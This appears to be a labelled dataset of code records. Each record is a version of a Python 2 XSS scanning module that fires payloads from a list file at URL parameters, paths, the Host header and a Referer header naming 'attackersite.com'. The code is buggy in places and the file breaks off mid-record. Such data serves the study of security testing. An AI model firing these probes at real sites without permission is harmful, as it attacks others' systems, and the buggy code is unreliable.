[{"id": "351a3ccd8dd6944ebeb0faf902c9de5f21be43b6", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    if xss_request_url.text.find(payload) != -1:\n                        impact = check_xss_impact()\n                        xss_result = True\n\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    if xss_request_url.text.find(payload) != -1:\n                        impact = check_xss_impact()\n                        xss_result = True\n\n                    if xss_result is True:\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n               \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_method(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "351a3ccd8dd6944ebeb0faf902c9de5f21be43b6", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n                        impact = check_xss_impact(xss_request_url.headers)\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n           \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    xss_payloads = fetch_xss_payload()\n    xss_get_method(url,method,headers,body,scanid)\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "c7435cdd6357bed9fa1859782a70ad6a7a71125d", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    if xss_request_url.text.find(payload) != -1:\n                        impact = check_xss_impact()\n                        xss_result = True\n\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    if xss_request_url.text.find(payload) != -1:\n                        impact = check_xss_impact()\n                        xss_result = True\n\n                    if xss_result is True:\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n               \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_method(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "c7435cdd6357bed9fa1859782a70ad6a7a71125d", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n                        impact = check_xss_impact(xss_request_url.headers)\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n           \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    xss_payloads = fetch_xss_payload()\n    xss_get_method(url,method,headers,body,scanid)\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "0ba0637b662761acf042636097913f8fb84df4c7", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        if host_header_xss.text.find(payload) != -1:\n            impact = \"Low\"\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            dbupdate.insert_record(xss_http_headers)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        if ref_header_xss.text.find(payload) != -1:\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if result is not True:\n                if xss_request_url.text.find(payload) != -1:\n                    impact = check_xss_impact(xss_request_url.headers)\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                    dbupdate.insert_record(attack_result)\n                    result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n    \n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "0ba0637b662761acf042636097913f8fb84df4c7", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    xss_result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                xss_result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                xss_result = True\n\n            if xss_result is True:\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                dbupdate.insert_record(attack_result)\n                return\n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        print \"param to test\",key\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        print xss_request.text\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        print \"all params\",vul_param\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        if host_header_xss.text.find(payload) != -1:\n            impact = \"Low\"\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            dbupdate.insert_record(xss_http_headers)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        if ref_header_xss.text.find(payload) != -1:\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if result is not True:\n                if xss_request_url.text.find(payload) != -1:\n                    impact = check_xss_impact(xss_request_url.headers)\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                    dbupdate.insert_record(attack_result)\n                    result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to 